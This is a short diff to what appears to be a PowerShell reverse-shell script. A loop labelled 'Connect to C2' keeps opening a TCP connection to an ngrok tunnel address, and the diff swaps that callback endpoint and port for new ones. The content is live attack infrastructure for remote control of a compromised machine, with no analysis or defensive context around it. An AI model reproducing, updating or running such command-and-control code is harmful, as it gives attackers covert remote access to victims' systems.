@@ -4,7 +4,7 @@ do {
 
     # Connect to C2
     try{
-        $TCPClient = New-Object Net.Sockets.TCPClient('0.tcp.eu.ngrok.io', 15610)
+        $TCPClient = New-Object Net.Sockets.TCPClient('2.tcp.eu.ngrok.io', 18922)
     } catch {}
 } until ($TCPClient.Connected)
 
